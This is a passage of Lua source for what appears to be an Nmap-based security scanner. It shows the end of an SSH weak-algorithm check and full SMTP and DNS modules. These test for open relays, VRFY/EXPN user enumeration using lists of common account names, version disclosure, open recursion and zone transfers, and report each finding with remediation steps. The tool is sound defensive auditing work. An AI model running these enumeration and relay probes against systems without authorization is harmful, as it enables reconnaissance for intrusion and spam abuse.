    .. "Weak algorithms detected are reported as separate HIGH findings.",
    {
      kex_algorithms      = table.concat(kex.kex,      ", "),
      hostkey_algorithms  = table.concat(kex.hostkey,  ", "),
      enc_algorithms_c2s  = table.concat(kex.enc_c2s,  ", "),
      enc_algorithms_s2c  = table.concat(kex.enc_s2c,  ", "),
      mac_algorithms_c2s  = table.concat(kex.mac_c2s,  ", "),
      mac_algorithms_s2c  = table.concat(kex.mac_s2c,  ", "),
      compression_c2s     = table.concat(kex.compress_c2s, ", "),
    },
    0.95,
    0.15    -- info only
  )

  -- ---- Weak KEX check --------------------------------------------------
  local weak_kex = ssh_find_weak(kex.kex, SSH_WEAK_KEX)
  if #weak_kex > 0 then
    local details = {}
    for _, w in ipairs(weak_kex) do
      table.insert(details, w.alg .. " (" .. w.reason .. ")")
    end
    ctx:add_finding(
      string.format("SSH: %d weak key-exchange algorithm(s) offered", #weak_kex),
      "The server offers deprecated or cryptographically weak key-exchange "
      .. "algorithms. These are listed in the evidence. An attacker in a "
      .. "privileged network position may be able to downgrade the session to "
      .. "a weak algorithm and recover session keys.",
      {
        weak_kex_list = table.concat(details, " | "),
        remediation   = "Remove weak KEX from KexAlgorithms in sshd_config; "
                        .. "prefer curve25519-sha256 and ecdh-sha2-nistp521",
      },
      0.95,
      0.60
    )
  end

  -- ---- Weak host-key check ---------------------------------------------
  local weak_hk = ssh_find_weak(kex.hostkey, SSH_WEAK_HOSTKEY)
  if #weak_hk > 0 then
    local details = {}
    for _, w in ipairs(weak_hk) do
      table.insert(details, w.alg .. " (" .. w.reason .. ")")
    end
    ctx:add_finding(
      string.format("SSH: %d weak host-key algorithm(s) offered", #weak_hk),
      "The server supports deprecated host-key types. These may allow "
      .. "server impersonation or be broken by advances in cryptanalysis.",
      {
        weak_hostkey_list = table.concat(details, " | "),
        remediation       = "Prefer ed25519 and rsa-sha2-512 host keys; "
                            .. "remove ssh-dss from HostKeyAlgorithms",
      },
      0.95,
      0.55
    )
  end

  -- ---- Weak cipher check (c2s + s2c combined, deduped) -----------------
  -- Combine both directions; report unique weak entries once
  local cipher_seen = {}
  local combined_enc = {}
  for _, alg in ipairs(kex.enc_c2s) do
    if not cipher_seen[alg] then
      cipher_seen[alg] = true
      table.insert(combined_enc, alg)
    end
  end
  for _, alg in ipairs(kex.enc_s2c) do
    if not cipher_seen[alg] then
      cipher_seen[alg] = true
      table.insert(combined_enc, alg)
    end
  end

  local weak_enc = ssh_find_weak(combined_enc, SSH_WEAK_CIPHER)
  if #weak_enc > 0 then
    local details = {}
    for _, w in ipairs(weak_enc) do
      table.insert(details, w.alg .. " (" .. w.reason .. ")")
    end
    ctx:add_finding(
      string.format("SSH: %d weak encryption cipher(s) offered", #weak_enc),
      "The server advertises support for weak or broken encryption ciphers. "
      .. "A downgrade attack can force the client to use these ciphers, "
      .. "potentially exposing session content.",
      {
        weak_ciphers  = table.concat(details, " | "),
        remediation   = "Set Ciphers to chacha20-poly1305@openssh.com, "
                        .. "aes256-gcm@openssh.com, aes128-gcm@openssh.com "
                        .. "in sshd_config",
      },
      0.95,
      0.65
    )
  end

  -- ---- Weak MAC check (c2s + s2c combined, deduped) --------------------
  local mac_seen = {}
  local combined_mac = {}
  for _, alg in ipairs(kex.mac_c2s) do
    if not mac_seen[alg] then
      mac_seen[alg] = true
      table.insert(combined_mac, alg)
    end
  end
  for _, alg in ipairs(kex.mac_s2c) do
    if not mac_seen[alg] then
      mac_seen[alg] = true
      table.insert(combined_mac, alg)
    end
  end

  local weak_mac = ssh_find_weak(combined_mac, SSH_WEAK_MAC)
  if #weak_mac > 0 then
    local details = {}
    for _, w in ipairs(weak_mac) do
      table.insert(details, w.alg .. " (" .. w.reason .. ")")
    end
    ctx:add_finding(
      string.format("SSH: %d weak MAC algorithm(s) offered", #weak_mac),
      "The server supports deprecated MAC algorithms. Weak MACs can allow "
      .. "an attacker to forge or modify encrypted packets without detection.",
      {
        weak_macs   = table.concat(details, " | "),
        remediation = "Set MACs to hmac-sha2-256-etm@openssh.com, "
                      .. "hmac-sha2-512-etm@openssh.com, umac-128-etm@openssh.com "
                      .. "in sshd_config",
      },
      0.95,
      0.55
    )
  end

  -- Compression check: zlib without -at-openssh.com variant can be a vector
  for _, alg in ipairs(kex.compress_c2s) do
    if alg == "zlib" then
      ctx:add_finding(
        "SSH: zlib compression enabled (pre-authentication)",
        "The server supports 'zlib' compression which operates before "
        .. "authentication. This makes the server a potential candidate for "
        .. "CRIME-style compression oracle attacks. Prefer "
        .. "'zlib@openssh.com' which activates only after authentication.",
        {
          compression_offered = "zlib",
          remediation         = "Replace 'zlib' with 'zlib@openssh.com' in "
                                .. "Compression setting of sshd_config",
        },
        0.90,
        0.45
      )
    end
  end

end)


end  




do  -- scope block: keeps locals under Lua 5.1's 200-variable limit



--- Parse SMTP 220 banner: extract software + version.
-- Common patterns:
--   "220 mail.example.com ESMTP Postfix (Ubuntu)"
--   "220 smtp.example.com Microsoft ESMTP MAIL Service"
--   "220-mx1.example.com ESMTP Exim 4.95 ..."
-- Returns table: { raw, hostname, software, version }
local function smtp_parse_banner(line)
  local raw      = trim(line)
  -- Strip leading code "220 " or "220-"
  local body     = raw:match("^220[- ](.+)") or raw
  local hostname = body:match("^([%w%.%-]+)") or "unknown"

  -- Try to find "Software vX.Y" or "Software X.Y"
  local software, version = body:match("([%a][%w]+)%s+v?(%d[%d%.%w%-]+)")
  if not software then
    -- Fallback: pick the most distinctive word after ESMTP/SMTP keyword
    software = body:match("[ES]SMTP%s+([%a][%w%s%-]+)") or
               body:match("([%a][%w%-]+)%s+[Ss]erver")  or
               "Unknown MTA"
    version  = "unknown"
  end
  return {
    raw      = raw,
    hostname = trim(hostname),
    software = trim(software),
    version  = trim(version or "unknown"),
  }
end

--- Read a potentially multi-line SMTP response (lines ending in "NNN-").
-- Returns the full concatenated body text and the final 3-digit code.
-- RFC 5321 §4.2: continuation lines have a hyphen after the code.
local function smtp_read_response(sd)
  local full = {}
  local final_code = nil
  for _ = 1, 50 do   -- safety limit
    local line, err = sock_readline(sd)
    if not line then
      return table.concat(full, "\n"), final_code, err
    end
    line = trim(line)
    table.insert(full, line)
    local code, sep = line:match("^(%d%d%d)([ \t%-]?)")
    if code then
      final_code = code
      if sep ~= "-" then break end   -- last line of response
    else
      break  -- malformed – stop
    end
  end
  return table.concat(full, "\n"), final_code, nil
end

--- Send EHLO and collect the capability list.
-- Returns (capabilities_table, raw_response) where capabilities_table
-- is a set: { ["STARTTLS"]=true, ["AUTH LOGIN"]=true, ... }
local function smtp_ehlo(sd, helo_domain)
  local ok, err = sock_send(sd, "EHLO " .. helo_domain .. "\r\n")
  if not ok then return nil, nil, "EHLO send failed: " .. err end

  local resp, code, rerr = smtp_read_response(sd)
  if not resp then return nil, nil, "EHLO read failed: " .. (rerr or "?") end

  if code ~= "250" then
    -- Fall back to HELO for very old servers
    sock_send(sd, "HELO " .. helo_domain .. "\r\n")
    resp, code, _ = smtp_read_response(sd)
    return {}, resp   -- HELO servers have no extensions
  end

  -- Parse capability keywords from each continuation line
  local caps = {}
  for line in resp:gmatch("[^\n]+") do
    -- Each line: "250-KEYWORD [params]" or "250 KEYWORD [params]"
    local keyword = line:match("^250[- ](.+)$")
    if keyword then
      keyword = trim(keyword)
      -- Normalise to uppercase key
      caps[keyword:upper()] = keyword
    end
  end
  return caps, resp
end

--- Attempt open-relay test.
-- Sends: MAIL FROM:<test@external.tld>  then  RCPT TO:<test@other-external.tld>
-- If the server accepts RCPT TO with 250 from a non-local sender to a
-- non-local recipient, it is an open relay.
-- We immediately send RSET to cancel the transaction — DATA is never sent.
-- Returns "relay" | "blocked" | "error" and the RCPT TO response.
local function smtp_test_relay(sd)
  -- Use clearly external, non-existent domains
  local ok, err = sock_send(sd, "MAIL FROM:<probe@reko-scanner.invalid>\r\n")
  if not ok then return "error", "MAIL FROM send failed: " .. err end

  local _, mcode, _ = smtp_read_response(sd)
  if mcode ~= "250" then
    -- Server rejected MAIL FROM — send RSET and report blocked
    sock_send(sd, "RSET\r\n")
    smtp_read_response(sd)
    return "blocked", "MAIL FROM rejected with: " .. (mcode or "?")
  end

  ok, err = sock_send(sd, "RCPT TO:<victim@relay-target.invalid>\r\n")
  if not ok then
    sock_send(sd, "RSET\r\n")
    return "error", "RCPT TO send failed: " .. err
  end

  local resp, rcode, _ = smtp_read_response(sd)

  -- Cancel the transaction regardless
  sock_send(sd, "RSET\r\n")
  smtp_read_response(sd)

  if rcode == "250" then
    return "relay", resp    -- server accepted relay
  else
    return "blocked", resp  -- 4xx / 5xx = relay denied
  end
end

--- Probe VRFY for a list of common usernames.
-- Returns a table of { username, response } for any accepted (2xx) responses.
-- Rate-limited: inserts a tiny inter-probe delay via socket timeout cycling.
local function smtp_vrfy_probe(sd, usernames)
  local hits = {}
  for _, user in ipairs(usernames) do
    local ok, _ = sock_send(sd, "VRFY " .. user .. "\r\n")
    if ok then
      local resp, code, _ = smtp_read_response(sd)
      if code and (code:sub(1,1) == "2" or code == "252") then
        table.insert(hits, { username = user, response = resp })
      end
    end
  end
  return hits
end

--- Probe EXPN for a list of common mailing-list names.
-- Returns hits the same way as smtp_vrfy_probe.
local function smtp_expn_probe(sd, listnames)
  local hits = {}
  for _, name in ipairs(listnames) do
    local ok, _ = sock_send(sd, "EXPN " .. name .. "\r\n")
    if ok then
      local resp, code, _ = smtp_read_response(sd)
      if code and code:sub(1,1) == "2" then
        table.insert(hits, { listname = name, response = resp })
      end
    end
  end
  return hits
end

-- Commonly-tested SMTP usernames (conservative, low-noise list)
local SMTP_TEST_USERS = {
  "root", "admin", "administrator", "postmaster", "webmaster",
  "info", "support", "helpdesk", "noreply", "mailer-daemon",
}

-- Common mailing list names
local SMTP_TEST_LISTS = {
  "all", "staff", "employees", "users", "admins",
  "security", "it", "helpdesk", "everyone",
}

-- HELO domain we present ourselves as
local SMTP_HELO = "reko.scanner.invalid"

-- Main SMTP module
register_module("smtp", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression

  -- Connect
  local sd, conn_err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "smtp", "Cannot connect: " .. conn_err)
    return
  end

  -- ---- [P1] Banner grab ------------------------------------------------
  local banner_line, berr = sock_readline(sd)
  if not banner_line then
    log_warn(ctx, "smtp", "No banner: " .. (berr or "timeout"))
    sock_close(sd)
    return
  end
  -- Drain any multi-line 220 greeting
  while banner_line:match("^220%-") do
    local next_line, _ = sock_readline(sd)
    if not next_line then break end
    banner_line = next_line
  end

  local banner = smtp_parse_banner(banner_line)
  log_info(ctx, "smtp", "Banner: " .. banner.raw)

  ctx:add_finding(
    "SMTP service banner disclosed",
    string.format(
      "The SMTP server's 220 greeting reveals MTA software and version. "
      .. "This information assists attackers in locating known CVEs. "
      .. "Software: %s  Version: %s  Hostname: %s",
      banner.software, banner.version, banner.hostname
    ),
    {
      banner_raw = banner.raw,
      software   = banner.software,
      version    = banner.version,
      hostname   = banner.hostname,
    },
    0.95, 0.30
  )

  -- ---- [P2] EHLO capability enumeration --------------------------------
  local caps, ehlo_resp = smtp_ehlo(sd, SMTP_HELO)
  if not caps then
    log_warn(ctx, "smtp", "EHLO failed")
    sock_close(sd)
    return
  end
  log_info(ctx, "smtp", "EHLO capabilities: " .. (ehlo_resp or ""))

  -- Build capability list for evidence
  local cap_list = {}
  for k, _ in pairs(caps) do table.insert(cap_list, k) end
  table.sort(cap_list)

  ctx:add_finding(
    string.format("SMTP EHLO capabilities enumerated (%d extensions)", #cap_list),
    "The server's EHLO response advertises all supported extensions. "
    .. "Review for AUTH mechanisms, size limits, and TLS support.",
    {
      capabilities = table.concat(cap_list, ", "),
    },
    0.95, 0.20
  )

  -- ---- [P3] STARTTLS check ---------------------------------------------
  local has_starttls = caps["STARTTLS"] ~= nil
  if not has_starttls then
    ctx:add_finding(
      "SMTP does not advertise STARTTLS – credentials sent in cleartext",
      "The server did not include STARTTLS in its EHLO capability list. "
      .. "Authentication credentials and email content transmitted over this "
      .. "connection are exposed to any network observer. Configure the MTA "
      .. "to offer STARTTLS and ideally enforce TLS for inbound connections.",
      {
        ehlo_capabilities = table.concat(cap_list, ", "),
        remediation       = "Enable TLS in MTA config (smtpd_tls_security_level "
                            .. "= may/encrypt for Postfix; tls_advertise_hosts "
                            .. "= * for Exim)",
      },
      0.95, 0.55
    )
  else
    log_info(ctx, "smtp", "STARTTLS advertised")
    ctx:add_finding(
      "SMTP STARTTLS is advertised",
      "The server offers STARTTLS. Verify that TLS is also enforced (not just "
      .. "optional) and that the certificate is valid and not self-signed.",
      { starttls = "advertised" },
      0.90, 0.10
    )
  end

  -- ---- Active checks (aggression >= 1) ----------------------------------
  if agg < 1 then
    sock_close(sd)
    return
  end

  -- ---- [A1] Open-relay test --------------------------------------------
  local relay_result, relay_resp = smtp_test_relay(sd)
  log_info(ctx, "smtp", "Open-relay result: " .. relay_result)

  if relay_result == "relay" then
    ctx:add_finding(
      "SMTP open relay confirmed (CRITICAL)",
      "The server accepted RCPT TO for a recipient at an external domain "
      .. "from a sender at an external domain. This makes the server a fully "
      .. "open relay — any internet host can use it to send spam, phishing, "
      .. "or malware delivery emails, causing severe reputational and legal damage.",
      {
        test_sender     = "probe@reko-scanner.invalid",
        test_recipient  = "victim@relay-target.invalid",
        rcpt_response   = relay_resp,
        remediation     = "Restrict relaying to authenticated clients and "
                          .. "authorised internal IP ranges only",
      },
      0.99, 0.85
    )
  elseif relay_result == "blocked" then
    log_info(ctx, "smtp", "Open relay: blocked (good)")
  else
    log_warn(ctx, "smtp", "Open relay probe error: " .. (relay_resp or ""))
  end

  -- ---- [A2] VRFY user enumeration -------------------------------------
  -- Re-issue EHLO to get a clean session state after relay test
  smtp_ehlo(sd, SMTP_HELO)

  local vrfy_hits = smtp_vrfy_probe(sd, SMTP_TEST_USERS)
  if #vrfy_hits > 0 then
    local user_list = {}
    for _, h in ipairs(vrfy_hits) do
      table.insert(user_list, h.username)
    end
    ctx:add_finding(
      string.format("SMTP VRFY enables user enumeration (%d user(s) confirmed)", #vrfy_hits),
      "The server's VRFY command confirmed the existence of local user accounts. "
      .. "An attacker can enumerate valid email addresses for spear-phishing, "
      .. "brute-force attacks, or social engineering.",
      {
        confirmed_users = table.concat(user_list, ", "),
        remediation     = "Disable VRFY: set 'disable_vrfy_command = yes' "
                          .. "(Postfix) or 'no_verify' (Sendmail)",
      },
      0.95, 0.65
    )
  end

  -- ---- [A3] EXPN mailing list enumeration ------------------------------
  local expn_hits = smtp_expn_probe(sd, SMTP_TEST_LISTS)
  if #expn_hits > 0 then
    local list_names = {}
    for _, h in ipairs(expn_hits) do
      table.insert(list_names, h.listname)
    end
    ctx:add_finding(
      string.format("SMTP EXPN enabled – mailing lists exposed (%d list(s))", #expn_hits),
      "The EXPN command revealed mailing list membership, exposing internal "
      .. "organisational structure and a bulk list of valid email addresses.",
      {
        exposed_lists = table.concat(list_names, ", "),
        remediation   = "Disable EXPN in MTA configuration",
      },
      0.95, 0.60
    )
  end

  sock_send(sd, "QUIT\r\n")
  sock_close(sd)
end)


-- ===========================================================================
-- DNS MODULE  (port 53/tcp and 53/udp)
-- ===========================================================================
-- Checks performed (by aggression level):
--
--  AGG 0 – passive:
--    [P1] Version probe: send a version.bind CHAOS TXT query
--         (many DNS servers reveal software + version in this response)
--    [P2] Recursion check: send a query for a public external name
--         (e.g. "google.com A") — if the server resolves it and returns
--         an answer for a name not in its own zone, recursion is open.
--    [P3] Common record enumeration: A, MX, NS, TXT, SOA for the
--         target's own domain (reverse-looked-up from the IP).
--
--  AGG 1 – safe-active:
--    [A1] Zone transfer (AXFR): attempt a full zone transfer for the
--         domain inferred from the target's PTR record. AXFR is a
--         single TCP query — we do NOT iterate subdomains or brute-force.
--
--  Scoring rationale:
--    base_weight for dns = 0.40
--    Zone transfer succeeds         → confidence 0.99, impact 0.80  → CRITICAL
--    Open recursion enabled         → confidence 0.95, impact 0.65  → HIGH
--    Version string disclosed       → confidence 0.95, impact 0.35  → MEDIUM
--    Record enumeration             → confidence 0.90, impact 0.20  → LOW
-- ===========================================================================

-- DNS message constants (RFC 1035)
local DNS_QR_QUERY    = 0
local DNS_QR_RESPONSE = 1
local DNS_OPCODE_QUERY= 0
local DNS_CLASS_IN    = 1
local DNS_CLASS_CHAOS = 3
local DNS_TYPE_A      = 1
local DNS_TYPE_NS     = 2
local DNS_TYPE_CNAME  = 5
local DNS_TYPE_SOA    = 6
local DNS_TYPE_MX     = 15
local DNS_TYPE_TXT    = 16
local DNS_TYPE_AAAA   = 28
local DNS_TYPE_AXFR   = 252
local DNS_TYPE_ANY    = 255

local DNS_RCODE_NOERROR  = 0
local DNS_RCODE_REFUSED  = 5

--- Encode a DNS name into wire format (length-prefixed labels + NUL).
-- "example.com" → "\x07example\x03com\x00"
local function dns_encode_name(name)
  local parts = {}
  -- Strip trailing dot if present
  name = name:gsub("%.$", "")
  for label in name:gmatch("[^%.]+") do
    table.insert(parts, string.char(#label) .. label)
  end
  table.insert(parts, "\x00")
  return table.concat(parts)
end

--- Build a minimal DNS query packet.
-- @param qname   string  domain name to query
-- @param qtype   number  DNS record type (DNS_TYPE_*)
-- @param qclass  number  DNS class (DNS_CLASS_IN or DNS_CLASS_CHAOS)
-- @param txid    number  transaction ID (0-65535)
-- Returns raw binary string.
local function dns_build_query(qname, qtype, qclass, txid)
  txid   = txid   or math.random(1, 65535)
  qclass = qclass or DNS_CLASS_IN

  -- Header: ID(2) FLAGS(2) QDCOUNT(2) ANCOUNT(2) NSCOUNT(2) ARCOUNT(2)
  -- FLAGS for a standard query: QR=0, OPCODE=0, AA=0, TC=0, RD=1, RA=0, Z=0, RCODE=0
  -- RD=1 (recursion desired) — we set this for the recursion check
  local flags   = 0x0100   -- RD bit set
  local header  = string.char(
    math.floor(txid / 256), txid % 256,   -- ID
    math.floor(flags / 256), flags % 256, -- FLAGS
    0, 1,   -- QDCOUNT = 1
    0, 0,   -- ANCOUNT = 0
    0, 0,   -- NSCOUNT = 0
    0, 0    -- ARCOUNT = 0
  )

  -- Question section
  local qname_wire = dns_encode_name(qname)
  local question   = qname_wire
    .. string.char(math.floor(qtype  / 256), qtype  % 256)  -- QTYPE
    .. string.char(math.floor(qclass / 256), qclass % 256)  -- QCLASS

  return header .. question
end

--- Send a DNS query over UDP and receive the response.
-- Returns (response_bytes, nil) or (nil, error_string).
local function dns_query_udp(host_ip, port_num, raw_query, timeout_ms)
  local sd = nmap.new_socket("udp")
  sd:set_timeout(timeout_ms)

  local ok, err = sd:sendto(host_ip, port_num, raw_query)
  if not ok then
    sock_close(sd)
    return nil, "UDP sendto failed: " .. tostring(err)
  end

  local status, data = sd:receive()
  sock_close(sd)
  if not status then
    return nil, "UDP receive failed: " .. tostring(data)
  end
  return data, nil
end

--- Send a DNS query over TCP (length-prefixed per RFC 1035 §4.2.2).
-- Returns (response_bytes_without_length_prefix, nil) or (nil, error_string).
local function dns_query_tcp(host_ip, port_num, raw_query, timeout_ms)
  local sd, conn_err = tcp_connect(host_ip, port_num, timeout_ms)
  if not sd then return nil, conn_err end

  -- TCP DNS prepends a 2-byte length field
  local prefixed = string.char(
    math.floor(#raw_query / 256), #raw_query % 256
  ) .. raw_query

  local ok, serr = sock_send(sd, prefixed)
  if not ok then
    sock_close(sd)
    return nil, "TCP send failed: " .. serr
  end

  -- Read 2-byte response length
  local status, len_bytes = sd:receive_bytes(2)
  if not status or #len_bytes < 2 then
    sock_close(sd)
    return nil, "TCP length read failed"
  end
  local resp_len = len_bytes:byte(1) * 256 + len_bytes:byte(2)

  if resp_len == 0 or resp_len > 65535 then
    sock_close(sd)
    return nil, "Implausible TCP response length: " .. resp_len
  end

  -- Read the response body
  status, data = sd:receive_bytes(resp_len)
  sock_close(sd)
  if not status then
    return nil, "TCP response read failed"
  end
  return data, nil
end

--- Parse the DNS response header fields we care about.
-- Returns table: { txid, qr, rcode, ancount, nscount, arcount, tc }
-- or nil on malformed input.
local function dns_parse_header(resp)
  if not resp or #resp < 12 then return nil end
  local txid    = resp:byte(1)  * 256 + resp:byte(2)
  local flags   = resp:byte(3)  * 256 + resp:byte(4)
  local qr      = math.floor(flags / 32768) % 2  -- bit 15
  local rcode   = flags % 16                      -- bits 0-3
  local tc      = math.floor(flags / 512)  % 2   -- bit 9 (truncated)
  local ancount = resp:byte(7)  * 256 + resp:byte(8)
  local nscount = resp:byte(9)  * 256 + resp:byte(10)
  local arcount = resp:byte(11) * 256 + resp:byte(12)
  return { txid=txid, qr=qr, rcode=rcode, tc=tc,
           ancount=ancount, nscount=nscount, arcount=arcount }
end

--- Decode a DNS name from wire format at position pos (1-indexed).
-- Handles pointer compression (RFC 1035 §4.1.4).
-- Returns (name_string, bytes_consumed_not_counting_pointers).
local function dns_decode_name(data, pos)
  local labels = {}
  local jumped = false
  local consumed = 0
  local safety = 0

  while safety < 128 do
    safety = safety + 1
    if pos > #data then break end
    local len = data:byte(pos)
    if len == 0 then
      if not jumped then consumed = consumed + 1 end
      break
    elseif math.floor(len / 64) == 3 then
      -- Pointer: 0xC0 | offset_high  followed by offset_low
      if pos + 1 > #data then break end
      local ptr = (len % 64) * 256 + data:byte(pos + 1)
      if not jumped then consumed = consumed + 2 end
      pos    = ptr + 1  -- 1-indexed
      jumped = true
    else
      -- Normal label
      if not jumped then consumed = consumed + 1 + len end
      local label = data:sub(pos + 1, pos + len)
      table.insert(labels, label)
      pos = pos + 1 + len
    end
  end
  return table.concat(labels, "."), consumed
end

--- Decode the TXT RDATA field.
-- TXT records: one or more length-prefixed character strings.
local function dns_decode_txt(rdata)
  local parts = {}
  local pos   = 1
  while pos <= #rdata do
    local slen = rdata:byte(pos)
    if not slen then break end
    table.insert(parts, rdata:sub(pos + 1, pos + slen))
    pos = pos + 1 + slen
  end
  return table.concat(parts)
end

--- Extract all answer TXT strings from a raw DNS response.
-- Returns table of strings.
local function dns_extract_txt_answers(resp)
  local hdr = dns_parse_header(resp)
  if not hdr or hdr.ancount == 0 then return {} end

  -- Skip header (12 bytes) + question section
  local pos = 13
  -- Skip the question name
  local _, qname_consumed = dns_decode_name(resp, pos)
  pos = pos + qname_consumed + 4  -- +4 for QTYPE + QCLASS

  local results = {}
  for _ = 1, hdr.ancount do
    if pos > #resp then break end
    -- Read name (may be compressed pointer)
    local _, name_consumed = dns_decode_name(resp, pos)
    pos = pos + name_consumed
    if pos + 10 > #resp then break end
    local rtype  = resp:byte(pos) * 256 + resp:byte(pos+1)
    -- local rclass = resp:byte(pos+2) * 256 + resp:byte(pos+3)
    -- local ttl    = read 4 bytes at pos+4 (ignored)
    local rdlen  = resp:byte(pos+8) * 256 + resp:byte(pos+9)
    pos = pos + 10
    local rdata  = resp:sub(pos, pos + rdlen - 1)
    pos = pos + rdlen
    if rtype == DNS_TYPE_TXT then
      table.insert(results, dns_decode_txt(rdata))
    end
  end
  return results
end

--- Count answer records in a raw DNS response (used for AXFR).
local function dns_count_answers(resp)
  local hdr = dns_parse_header(resp)
  if not hdr then return 0 end
  return hdr.ancount
end

--- Infer the domain name from a target IP using reverse-DNS.
-- Falls back to using the IP itself as a label (not a valid FQDN but
-- useful to document what we tried).
local function infer_domain(host)
  -- Use Nmap's own reverse-DNS result if available
  if host.name and host.name ~= "" then
    -- Strip the hostname label to get the domain:
    --   "mail.example.com" → "example.com"
    local parts = {}
    for part in host.name:gmatch("[^%.]+") do
      table.insert(parts, part)
    end
    if #parts >= 2 then
      -- Take last two labels as the base domain
      return parts[#parts-1] .. "." .. parts[#parts]
    end
    return host.name
  end
  -- No reverse DNS: return nil (caller will skip zone-dependent checks)
  return nil
end

-- Public external name used for the recursion check.
-- We use a well-known, stable FQDN that won't be in any private zone.
local DNS_RECURSION_TEST_NAME = "google.com"

-- Main DNS module
register_module("dns", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number   -- usually 53
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression
  local host_obj = ctx.host

  -- ---- [P1] version.bind CHAOS TXT probe --------------------------------
  -- This is a passive probe — we query a well-known meta-name.
  -- Many DNS servers return their software/version here.
  local version_query = dns_build_query("version.bind", DNS_TYPE_TXT, DNS_CLASS_CHAOS)
  local vresp, verr   = dns_query_udp(host_ip, port_num, version_query, timeout)

  if vresp then
    local txt_answers = dns_extract_txt_answers(vresp)
    if #txt_answers > 0 then
      local version_str = table.concat(txt_answers, "; ")
      log_info(ctx, "dns", "version.bind: " .. version_str)
      ctx:add_finding(
        "DNS server version disclosed via version.bind",
        "The server responded to a version.bind CHAOS TXT query with its "
        .. "software version string. Attackers use this to identify specific "
        .. "CVEs. Disable version disclosure by setting 'version' to 'none' "
        .. "or a custom string in your DNS server configuration.",
        {
          version_string = version_str,
          query          = "version.bind CHAOS TXT",
          remediation    = "BIND: set 'version \"none\";' in options {}; "
                           .. "Unbound: set 'hide-version: yes'; "
                           .. "PowerDNS: version-string=anonymous",
        },
        0.95, 0.35
      )
    else
      log_info(ctx, "dns", "version.bind: no answer (good – version hidden)")
    end
  else
    log_info(ctx, "dns", "version.bind UDP failed: " .. (verr or ""))
  end

  -- ---- [P2] Open recursion check ----------------------------------------
  -- Query for an external public name. If the response has an answer section
  -- AND the server is not authoritative for that name, recursion is open.
  local rec_query  = dns_build_query(DNS_RECURSION_TEST_NAME, DNS_TYPE_A, DNS_CLASS_IN)
  local rresp, rerr = dns_query_udp(host_ip, port_num, rec_query, timeout)

  if rresp then
    local hdr = dns_parse_header(rresp)
    if hdr and hdr.qr == DNS_QR_RESPONSE and hdr.ancount > 0 and hdr.rcode == DNS_RCODE_NOERROR then
      log_warn(ctx, "dns", "Open recursion CONFIRMED – server resolved " .. DNS_RECURSION_TEST_NAME)
      ctx:add_finding(
        "DNS open recursion enabled (DNS amplification attack risk)",
        "The server resolved an external name (" .. DNS_RECURSION_TEST_NAME .. ") "
        .. "on behalf of our query. Open recursive resolvers can be abused in "
        .. "DNS amplification DDoS attacks (up to 100× traffic amplification) "
        .. "and may be used for internal network reconnaissance if they resolve "
        .. "internal names for external clients.",
        {
          test_query      = DNS_RECURSION_TEST_NAME .. " A",
          answer_count    = tostring(hdr.ancount),
          remediation     = "Restrict recursion to authorised client IP ranges: "
                            .. "'allow-recursion { trusted_acl; };' (BIND) "
                            .. "or 'access-control: <cidr> allow' (Unbound)",
        },
        0.95, 0.65
      )
    elseif hdr and (hdr.rcode == DNS_RCODE_REFUSED or hdr.ancount == 0) then
      log_info(ctx, "dns", "Recursion appears restricted (REFUSED or no answer) – good")
    else
      log_info(ctx, "dns", "Recursion check: ambiguous response")
    end
  else
    log_warn(ctx, "dns", "Recursion check UDP failed: " .. (rerr or ""))
  end

  -- ---- [P3] Common record enumeration -----------------------------------
  local domain = infer_domain(host_obj)
  if domain then
    log_info(ctx, "dns", "Enumerating common records for: " .. domain)

    -- Query SOA, NS, MX, TXT for the inferred domain
    local record_types = {
      { name = domain, qtype = DNS_TYPE_SOA,  label = "SOA"  },
      { name = domain, qtype = DNS_TYPE_NS,   label = "NS"   },
      { name = domain, qtype = DNS_TYPE_MX,   label = "MX"   },
      { name = domain, qtype = DNS_TYPE_TXT,  label = "TXT"  },
    }

    local found_records = {}
    for _, rt in ipairs(record_types) do
      local q    = dns_build_query(rt.name, rt.qtype, DNS_CLASS_IN)
      local resp, _ = dns_query_udp(host_ip, port_num, q, timeout)
      if resp then
        local hdr = dns_parse_header(resp)
        if hdr and hdr.ancount > 0 then
          table.insert(found_records, rt.label .. "(" .. hdr.ancount .. " records)")
        end
      end
    end

    if #found_records > 0 then
      ctx:add_finding(
        "DNS common record types enumerated for " .. domain,
        "The DNS server answered queries for common record types on the "
        .. "inferred domain. This confirms the server is authoritative "
        .. "for (or can resolve) this domain and reveals available record types "
        .. "useful for further enumeration.",
        {
          domain      = domain,
          found_types = table.concat(found_records, ", "),
        },
        0.90, 0.20
      )
    end
  else
    log_info(ctx, "dns", "Could not infer domain from PTR – skipping record enumeration")
  end

  -- ---- Active checks (aggression >= 1) ----------------------------------
  if agg < 1 then return end

  -- ---- [A1] Zone transfer (AXFR) attempt --------------------------------
  if not domain then
    log_info(ctx, "dns", "No domain inferred – skipping AXFR attempt")
    return
  end

  log_info(ctx, "dns", "Attempting AXFR for domain: " .. domain)

  -- AXFR must be sent over TCP (RFC 5936)
  local axfr_query  = dns_build_query(domain, DNS_TYPE_AXFR, DNS_CLASS_IN)
  local axfr_resp, axfr_err = dns_query_tcp(host_ip, port_num, axfr_query, timeout)

  if not axfr_resp then
    log_info(ctx, "dns", "AXFR TCP failed: " .. (axfr_err or "connection refused"))
    return
  end

  local hdr = dns_parse_header(axfr_resp)
  if not hdr then
    log_warn(ctx, "dns", "AXFR: could not parse response header")
    return
  end

  if hdr.rcode == DNS_RCODE_REFUSED then
    log_info(ctx, "dns", "AXFR refused by server (good – zone transfers restricted)")
    return
  end

  -- If ancount > 1 the server returned records (SOA + zone data)
  -- A successful AXFR starts and ends with the SOA record; ancount >= 2
  if hdr.ancount >= 2 then
    -- Count total bytes as a proxy for zone size (actual record parsing
    -- requires a full RR decoder — added in a future iteration)
    ctx:add_finding(
      "DNS zone transfer (AXFR) succeeded – full zone data exposed (CRITICAL)",
      "The DNS server permitted an unauthenticated AXFR (zone transfer) request "
      .. "for domain " .. domain .. ". An attacker gains a complete list of "
      .. "all hostnames, IP addresses, MX records, and internal infrastructure "
      .. "from a single query — dramatically accelerating target enumeration.",
      {
        domain        = domain,
        answer_count  = tostring(hdr.ancount),
        response_size = tostring(#axfr_resp) .. " bytes",
        remediation   = "Restrict AXFR to authorised secondary nameserver IPs: "
